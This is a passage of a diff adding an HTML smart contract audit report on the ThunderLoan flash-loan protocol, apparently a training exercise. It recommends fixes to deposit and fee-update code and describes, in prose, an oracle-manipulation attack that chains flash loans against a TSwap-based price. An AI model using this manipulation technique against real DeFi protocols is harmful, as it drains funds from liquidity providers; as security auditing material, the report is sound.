+<span class="hljs-addition">+           }</span>
+        }
+    }
+
+</div></code></pre>
+  </details>
+  <details>
+  <summary>Adjust the code of `ThunderLoan.sol::deposit` as follows</summary>
+<pre class="hljs"><code><div>
+<span class="hljs-addition">+   error ThunderLoan__ThisTokenIsNotAllowedForDepositsAnymore();</span>
+
+    function deposit(IERC20 token, uint256 amount) external revertIfZero(amount) revertIfNotAllowedToken(token) {
+<span class="hljs-addition">+     if(isAllowedForDeposits[token] == false){</span>
+<span class="hljs-addition">+       revert ThunderLoan__ThisTokenIsNotAllowedForDepositsAnymore();</span>
+<span class="hljs-addition">+     }</span>
+
+      AssetToken assetToken = s_tokenToAssetToken[token];
+      uint256 exchangeRate = assetToken.getExchangeRate();
+      uint256 mintAmount = (amount * assetToken.EXCHANGE_RATE_PRECISION()) / exchangeRate;
+      emit Deposit(msg.sender, token, amount);
+      assetToken.mint(msg.sender, mintAmount);
+      uint256 calculatedFee = getCalculatedFee(token, amount);
+      assetToken.updateExchangeRate(calculatedFee);
+      token.safeTransferFrom(msg.sender, address(assetToken), amount);
+    }
+
+</div></code></pre>
+  </details>
+<p>2.Upgradability
+2.1 Remove Upgrade funcionalities
+2.2 Stablish a consul to take this kind of decision</p>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Using TSwap as price oracle leads to price and oracle manipulation attacks</strong></p>
+<ul>
+<li>
+<p><strong>Description:</strong></p>
+<ul>
+<li>The TSwap protocol is a constant product formula based AMM (automated market maker). The price of a token is determined by how many reserves are on either side of the pool. Because of this, it is easy for malicious users to manipulate the price of a token by buying or selling a large amount of the token in the same transaction, essentially ignoring protocol fees.</li>
+</ul>
+</li>
+<li>
+<p><strong>Impact:</strong></p>
+<ul>
+<li>Liquidity providers will drastically reduced fees for providing liquidity.</li>
+</ul>
+</li>
+<li>
+<p><strong>Proof of Concept:</strong></p>
+<ul>
+<li>
+<p>The following all happens in 1 transaction.</p>
+<ol>
+<li>User takes a flash loan from <code>ThunderLoan</code> for 1000 <code>tokenA</code>. They are charged the original fee <code>fee1</code>. During the flash loan, they do the following:
+i. User sells 1000 <code>tokenA</code>, tanking the price.
+ii. Instead of repaying right away, the user takes out another flash loan for another 1000 <code>tokenA</code>.
+a. Due to the fact that the way <code>ThunderLoan</code> calculates price based on the <code>TSwapPool</code> this second flash loan is substantially cheaper.<pre class="hljs"><code><div>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getPriceInWeth</span>(<span class="hljs-params">address token</span>) <span class="hljs-title">public</span> <span class="hljs-title">view</span> <span class="hljs-title">returns</span> (<span class="hljs-params">uint256</span>) </span>{
+        address swapPoolOfToken = IPoolFactory(s_poolFactory).getPool(token);
+@&gt;      <span class="hljs-keyword">return</span> ITSwapPool(swapPoolOfToken).getPriceOfOnePoolTokenInWeth();
+    }
+</div></code></pre>
+</li>
+<li>The user then repays the first flash loan, and then repays the second flash loan.</li>
+</ol>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Recommendation:</strong></p>
+<ul>
+<li>Consider using a different price oracle mechanism, like a Chainlink price feed with a Uniswap TWAP fallback oracle.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="low-severity-vulnerabilities">Low Severity Vulnerabilities</h3>
+<ul>
+<li><strong>Missing critial event emissions</strong>
+<ul>
+<li><strong>Description:</strong>
+<ul>
+<li>When the <code>ThunderLoan::s_flashLoanFee</code> is updated, there is no event emitted.</li>
+</ul>
+</li>
+<li><strong>Impact:</strong></li>
+<li><strong>Proof of Concept:</strong></li>
+<li><strong>Recommendation:</strong>
+<ul>
+<li>
+<p>Emit an event when the <code>ThunderLoan::s_flashLoanFee</code> is updated.</p>
+<pre class="hljs"><code><div><span class="hljs-addition">+    event FlashLoanFeeUpdated(uint256 newFee);</span>
+.
+.
+.
+    function updateFlashLoanFee(uint256 newFee) external onlyOwner {
+        if (newFee &gt; s_feePrecision) {
+            revert ThunderLoan__BadNewFee();
+        }
+        s_flashLoanFee = newFee;
+<span class="hljs-addition">+       emit FlashLoanFeeUpdated(newFee); </span>
+    }
+</div></code></pre>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+</body>
+</html>
